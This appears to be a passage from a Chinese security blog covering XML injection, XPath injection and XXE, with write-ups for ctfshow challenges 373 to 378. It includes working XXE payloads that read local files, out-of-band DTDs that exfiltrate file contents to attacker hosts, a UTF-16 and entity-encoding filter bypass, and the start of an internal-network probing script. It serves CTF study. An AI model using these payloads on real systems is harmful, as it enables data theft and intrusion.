class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">body</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span><span class="hljs-comment">&lt;!--定义body元素为”#PCDATA”类型--&gt;</span><br></code></pre></td></tr></table></figure><p>外部实体协议支持</p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211204212420637.png"></p><h3 id="实体参数"><a href="#实体参数" class="headerlink" title="实体参数"></a>实体参数</h3><ul><li>通用实体</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?XML version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span> <br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">updateProfile</span> [<span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">file</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///c:/windows/win.ini&quot;</span>&gt;</span> ]&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">updateProfile</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">firstname</span>&gt;</span>Joe<span class="hljs-tag">&lt;/<span class="hljs-name">firstname</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">lastname</span>&gt;</span><span class="hljs-symbol">&amp;file;</span><span class="hljs-tag">&lt;/<span class="hljs-name">lastname</span>&gt;</span>  <br>    ... <br><span class="hljs-tag">&lt;/<span class="hljs-name">updateProfile</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>参数实体</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">an-element</span> <span class="hljs-meta-string">&quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;</span>&gt;</span> <br><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">remote-dtd</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;http://somewhere.example.org/remote.dtd&quot;</span>&gt;</span> <br>%an-element; %remote-dtd;<br></code></pre></td></tr></table></figure><blockquote><p>对于参数实体：</p><p>1.使用 <code>% 实体名</code>(<strong>这里面空格不能少</strong>) 在 DTD 中定义，并且<strong>只能在 DTD 中使用 <code>%实体名;</code> 引用</strong><br>2.只有在 DTD 文件中，参数实体的声明才能引用其他实体<br>3.和通用实体一样，参数实体也可以外部引用</p></blockquote><h1 id="XML注入"><a href="#XML注入" class="headerlink" title="XML注入"></a>XML注入</h1><p>在用户能控制输入时，改变闭合即可注入</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002645-e7aed0d2-ec17-1.png"></p><p>通过XML注入添加了一个名为USER2的管理员账户。<br>XML注入两大要素：<strong>标签闭合和获取XML表结构</strong></p><h1 id="XPath注入"><a href="#XPath注入" class="headerlink" title="XPath注入"></a>XPath注入</h1><p>XPath注入攻击是指利用XPath 解析器的松散输入和容错特性，能够在 URL、表单或其它信息上附带恶意的XPath  查询代码，以获得权限信息的访问权并更改这些信息。XPath注入攻击是针对Web服务应用新的攻击方法，它允许攻击者在事先不知道XPath查询相关知识的情况下，通过XPath查询得到一个XML文档的完整内容。</p><p>XPath注入发生在当站点使用用户输入的信息来构造请求以获取XML数据。攻击者对站点发送经过特殊构造的信息来探究站点使用的XML是如何构造的，从而进一步获取正常途径下无法获取的数据。当XML数据被用作账户验证时，攻击者还可以提升他的权限。</p><p>XPath注入攻击同SQL注入攻击类似，但与SQL注入相比，XPath具有的优势：</p><ol><li>广泛性<br> 只要是利用XPath语法的Web 应用程序若未对输入的XPath查询做严格的处理都会存在XPath注入漏洞。而在SQL注入攻击过程中根据数据库支持的SQL语言不同，注入攻击的实现可能不同。</li><li>危害性大<br> XPath语言几乎可以没有访问控制限制的引用XML文档的所有部分。而在SQL注入中，一个“<code>用户</code>”的权限可能被限制到 某一特定的表、列或者查询。<br> XPath注入攻击可以保证得到完整的XML文档，即完整的数据库。只要Web服务应用具有基本的安全漏洞，即可构造针对 XPath应用的自动攻击。</li></ol><p>学习sql注入时要学习数据库语言，同样这里要学习XML的语言XPtah</p><p><a href="https://www.freebuf.com/column/211251.html">https://www.freebuf.com/column/211251.html</a></p><p>后续补</p><h1 id="XXE-XML外部实体注入"><a href="#XXE-XML外部实体注入" class="headerlink" title="XXE(XML外部实体注入)"></a>XXE(XML外部实体注入)</h1><p>通过XXE可以实现敏感文件读取，PHP RCE执行，内网探测(发现主机，扫描端口，内网盲注等)，文件上传，拒绝服务攻击</p><p>实验</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    libxml_disable_entity_loader (<span class="hljs-literal">false</span>);<br>    <span class="hljs-variable">$xmlfile</span> = file_get_contents(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br>    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> DOMDocument();<br>    <span class="hljs-variable">$dom</span>-&gt;loadXML(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD); <br>    <span class="hljs-variable">$creds</span> = simplexml_import_dom(<span class="hljs-variable">$dom</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$creds</span>;<br></code></pre></td></tr></table></figure><ul><li><code>file_get_contents</code>获取客户端输入内容</li><li><code>new DOMDocument()</code>初始化XML解析器</li><li><code>loadXML($xmlfile)</code>加载客户端输入的XML内容</li><li><code>simplexml_import_dom($dom)</code>获取XML文档节点，如果成功则返回SimpleXMLElement对象，如果失败则返回FALSE。</li></ul><p>引入内部实体：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span> <br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">xxe</span> [  </span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">file</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///c:/windows/system32/drivers/etc/hosts&quot;</span>&gt;</span>]&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">data</span>&gt;</span><span class="hljs-symbol">&amp;file;</span><span class="hljs-tag">&lt;/<span class="hljs-name">data</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211204230757218.png"></p><ul><li>ctfshow373</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>libxml_disable_entity_loader(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$xmlfile</span> = file_get_contents(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> DOMDocument();<br>    <span class="hljs-variable">$dom</span>-&gt;loadXML(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<br>    <span class="hljs-variable">$creds</span> = simplexml_import_dom(<span class="hljs-variable">$dom</span>);<br>    <span class="hljs-variable">$ctfshow</span> = <span class="hljs-variable">$creds</span>-&gt;ctfshow;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$ctfshow</span>;<br>&#125;<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);   <br></code></pre></td></tr></table></figure><p>获取输入，初始化XML解析器，加载客服端输入的XML内容，获取到XML文档节点，将dom节点转换为SimpleXMLElement对象即creds，输出creds中的变量ctfshow</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span> <br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">xxe</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">xxe</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///flag&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">creds</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">ctfshow</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">ctfshow</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">creds</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>ctfshow374</li></ul><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mojolicious"><span class="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">test</span> [</span></span><br><span class="hljs-meta"><span class="xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">file</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;php://filter/read=convert.base64-encode/resource=/flag&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">evil</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;http://ip:2333/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="xml"></span></span><span class="perl">%evil;</span><span class="xml"><span class="hljs-meta"></span></span><br><span class="hljs-meta"><span class="xml"></span></span><span class="perl">%dtd;</span><span class="xml"><span class="hljs-meta"></span></span><br><span class="hljs-meta"><span class="xml"></span></span><span class="perl">%xxe;</span><br></code></pre></td></tr></table></figure><p>evil.dtd</p><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mojolicious"><span class="xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">dtd</span> <span class="hljs-meta-string">&quot;&lt;!ENTITY &amp;#x25; xxe SYSTEM &#x27;http://vps:2333/%file;&#x27;&gt; &quot;</span>&gt;</span></span><br><span class="xml"></span><span class="perl">%dtd;</span><span class="xml"></span><br><span class="xml"></span><span class="perl">%xxe;</span><br></code></pre></td></tr></table></figure><blockquote><p>python3 -m http.server 2333</p></blockquote><p>可以公用一个端口，也可以区分开，如下</p><ul><li>ctfshow 375</li></ul><p>在374的基础上进行过滤</p><blockquote><p>if(preg_match(‘/&lt;?xml version=”1.0”/‘, $xmlfile)){ die(‘error’); }</p></blockquote><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mojolicious"><span class="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">test</span> [</span></span><br><span class="hljs-meta"><span class="xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">file</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;php://filter/read=convert.base64-encode/resource=/flag&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">evil</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;http://ip:2333/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="xml"></span></span><span class="perl">%evil;</span><span class="xml"><span class="hljs-meta"></span></span><br><span class="hljs-meta"><span class="xml"></span></span><span class="perl">%dtd;</span><span class="xml"><span class="hljs-meta"></span></span><br><span class="hljs-meta"><span class="xml"></span></span><span class="perl">%xxe;</span><br></code></pre></td></tr></table></figure><p>evil.dtd</p><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mojolicious"><span class="xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">dtd</span> <span class="hljs-meta-string">&quot;&lt;!ENTITY &amp;#x25; xxe SYSTEM &#x27;http://vps:1234/%file;&#x27;&gt; &quot;</span>&gt;</span></span><br><span class="xml"></span><span class="perl">%dtd;</span><span class="xml"></span><br><span class="xml"></span><span class="perl">%xxe;</span><br></code></pre></td></tr></table></figure><blockquote><p>python3 -m http.server 2333</p><p>python3 -m http.server 1234</p></blockquote><ul><li>ctfshow 377</li></ul><p>过滤了http协议，用utf16编码绕过，python发包</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&#x27;http://d7a2ee70-cbf2-4e93-b189-e52a4c8dfee9.challenge.ctf.show/&#x27;</span><br>payload = <span class="hljs-string">&quot;&quot;&quot;&lt;!DOCTYPE test [</span><br><span class="hljs-string">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span><br><span class="hljs-string">&lt;!ENTITY % aaa SYSTEM &quot;http://ip/evil.dtd&quot;&gt;</span><br><span class="hljs-string">%aaa;</span><br><span class="hljs-string">]&gt;</span><br><span class="hljs-string">&lt;root&gt;123&lt;/root&gt;&quot;&quot;&quot;</span><br>payload = payload.encode(<span class="hljs-string">&#x27;utf-16&#x27;</span>)<br>requests.post(url ,data=payload)<br></code></pre></td></tr></table></figure><p>服务器配置evil.dtd</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">dtd</span> <span class="hljs-meta-string">&quot;&lt;!ENTITY &amp;#x25; xxe SYSTEM &#x27;http://ip/%file;&#x27;&gt; &quot;</span>&gt;</span><br>%dtd;<br>%xxe;<br></code></pre></td></tr></table></figure><ul><li>ctfshow378</li></ul><p>是xxe-lab的php-xxe</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">xxe</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">file</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file://flag&quot;</span>&gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;file;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span><span class="hljs-symbol">&amp;file;</span><span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>当文件内容包含大量<code>&lt; &gt; &amp; &quot;</code>等会出现报错</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml">&gt;<span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span> <br>&gt;<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">xxe</span> [  </span><br><span class="hljs-meta">&gt;<span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">file</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///D:/1.txt&quot;</span>&gt;</span> ]&gt;</span> <br>&gt;<span class="hljs-tag">&lt;<span class="hljs-name">creds</span>&gt;</span><span class="hljs-symbol">&amp;file;</span><span class="hljs-tag">&lt;/<span class="hljs-name">creds</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211205152814834.png"></p><ul><li>服务端有回显</li></ul><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs django"><span class="xml">&gt;<span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span> </span><br><span class="xml">&gt;<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">roottag</span> [</span></span><br><span class="hljs-meta"><span class="xml">&gt;<span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">start</span> <span class="hljs-meta-string">&quot;&lt;![CDATA[&quot;</span>&gt;</span>   </span></span><br><span class="hljs-meta"><span class="xml">&gt;<span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">file</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///含&lt;&gt;&amp;&quot;</span>等的文件<span class="hljs-meta-string">&quot;&gt;  </span></span></span></span><br><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta"><span class="xml">&gt;&lt;!ENTITY % end &quot;</span>]]&gt;</span>&quot;&gt;  </span></span><br><span class="hljs-meta"><span class="xml">&gt;<span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">dtd</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;http://ip/evil.dtd&quot;</span>&gt;</span> </span></span><br><span class="hljs-meta"><span class="xml">&gt;%dtd; ]&gt;</span> </span><br><span class="xml"></span><br><span class="xml">&gt;<span class="hljs-tag">&lt;<span class="hljs-name">roottag</span>&gt;</span><span class="hljs-symbol">&amp;all;</span><span class="hljs-tag">&lt;/<span class="hljs-name">roottag</span>&gt;</span></span><br><span class="xml"></span><br><span class="xml">&gt;本地测试：</span><br><span class="xml">&gt;<span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="xml">&gt;<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">xxe</span> [</span></span><br><span class="hljs-meta"><span class="xml">&gt;<span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">start</span> <span class="hljs-meta-string">&quot;&lt;![CDATA[&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="xml">&gt;<span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">file</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///d:/1.txt&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="xml">&gt;<span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">end</span> <span class="hljs-meta-string">&quot;]]&gt;&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="xml">&gt;<span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">dtd</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///d:/a.dtd&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="xml">&gt;%dtd; ]&gt;</span></span><br><span class="xml">&gt;<span class="hljs-tag">&lt;<span class="hljs-name">creds</span>&gt;</span><span class="hljs-symbol">&amp;all;</span><span class="hljs-tag">&lt;/<span class="hljs-name">creds</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>evil.dtd</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml">&gt;<span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span> <br>&gt;<span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">all</span> <span class="hljs-meta-string">&quot;%start;%file;%end;&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211205153830896.png"></p><ul><li>服务端无回显</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml">&gt;<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">convert</span> [ </span><br><span class="hljs-meta">&gt;<span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">remote</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;http://ip/evil.dtd&quot;</span>&gt;</span></span><br><span class="hljs-meta">&gt;%remote;%int;%send;</span><br><span class="hljs-meta">&gt;]&gt;</span><br></code></pre></td></tr></table></figure><p>evil.dtd</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml">&gt;<span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">file</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;php://filter/read=convert.base64-encode/resource=/flag&quot;</span>&gt;</span><br>&gt;<span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">int</span> <span class="hljs-meta-string">&quot;&lt;!ENTITY % send SYSTEM &#x27;http://ip:2333?p=%file;&#x27;&gt;&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure></blockquote><p>SVG格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?XML version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;<br>&lt;!DOCTYPE note [<br>&lt;!ENTITY file SYSTEM &quot;要读取的文件路径&quot; &gt;<br>]&gt;<br>&lt;svg height=&quot;100&quot; width=&quot;1000&quot;&gt;<br>  &lt;text x=&quot;10&quot; y=&quot;20&quot;&gt;&amp;file;&lt;/text&gt;<br>&lt;/svg&gt;<br></code></pre></td></tr></table></figure><p>数据外带</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;!DOCTYPE root [ <br>&lt;!ENTITY % remote SYSTEM &quot;http://174.1.66.167/shell.dtd&quot;&gt;<br>%remote;<br>]&gt;<br><br>shell.dtd<br>&lt;!ENTITY % file SYSTEM &quot;file:///flag&quot;&gt;<br>&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://i/?flag=%file;&#x27;&gt;&quot;&gt;<br>%int;<br>%send;<br></code></pre></td></tr></table></figure><p>xxe绕过的payload</p><p>当只过滤了SYSTEM，PUBLIC等关键字时，可用双重实体编码绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?XML version=&quot;1.0&quot;?&gt;<br><br>&lt;!DOCTYPE GVI [<br><br>    &lt;!ENTITY % XML &quot;&amp;#60;&amp;#33;&amp;#69;&amp;#78;&amp;#84;&amp;#73;&amp;#84;&amp;#89;&amp;#32;&amp;#120;&amp;#120;&amp;#101;&amp;#32;&amp;#83;&amp;#89;&amp;#83;&amp;#84;&amp;#69;&amp;#77;&amp;#32;&amp;#34;&amp;#102;&amp;#105;&amp;#108;&amp;#101;&amp;#58;&amp;#47;&amp;#47;&amp;#47;&amp;#102;&amp;#108;&amp;#97;&amp;#103;&amp;#46;&amp;#116;&amp;#120;&amp;#116;&amp;#34;&amp;#32;&amp;#62;&amp;#93;&amp;#62;&amp;#10;&amp;#60;&amp;#99;&amp;#111;&amp;#114;&amp;#101;&amp;#62;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#60;&amp;#109;&amp;#101;&amp;#115;&amp;#115;&amp;#97;&amp;#103;&amp;#101;&amp;#62;&amp;#38;&amp;#120;&amp;#120;&amp;#101;&amp;#59;&amp;#60;&amp;#47;&amp;#109;&amp;#101;&amp;#115;&amp;#115;&amp;#97;&amp;#103;&amp;#101;&amp;#62;&amp;#10;&amp;#60;&amp;#47;&amp;#99;&amp;#111;&amp;#114;&amp;#101;&amp;#62;&quot;&gt;<br><br>    %XML;<br></code></pre></td></tr></table></figure><p>即为在XML实体中再定义一次XML，可成功被解析，支持dtd数据外带</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;!ENTITY xxe SYSTEM &quot;file:///flag.txt&quot; &gt;]&gt;<br>&lt;core&gt;<br>      &lt;message&gt;&amp;xxe;&lt;/message&gt;<br>&lt;/core&gt;<br></code></pre></td></tr></table></figure><h2 id="内网探测"><a href="#内网探测" class="headerlink" title="内网探测"></a>内网探测</h2><p>主机发现</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-comment">#Origtional XML that the server accepts</span><br><span class="hljs-comment">#&lt;xml&gt;</span><br><span class="hljs-comment">#    &lt;stuff&gt;user&lt;/stuff&gt;</span><br><span class="hljs-comment">#&lt;/xml&gt;</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">build_xml</span>(<span class="hljs-params">string</span>):</span><br>    xml = <span class="hljs-string">&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&quot;&quot;&quot;</span><br>    xml = xml + <span class="hljs-string">&quot;\r\n&quot;</span> + <span class="hljs-string">&quot;&quot;&quot;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;&quot;&quot;&quot;</span><br>    xml = xml + <span class="hljs-string">&quot;\r\n&quot;</span> + <span class="hljs-string">&quot;&quot;&quot;&lt;!ENTITY xxe SYSTEM &quot;&quot;&quot;</span> + <span class="hljs-string">&#x27;&quot;&#x27;</span> + string + <span class="hljs-string">&#x27;&quot;&#x27;</span> + <span class="hljs-string">&quot;&quot;&quot;&gt;]&gt;&quot;&quot;&quot;</span><br>    xml = xml + <span class="hljs-string">&quot;\r\n&quot;</span> + <span class="hljs-string">&quot;&quot;&quot;&lt;xml&gt;&quot;&quot;&quot;</span><br>    xml = xml + <span 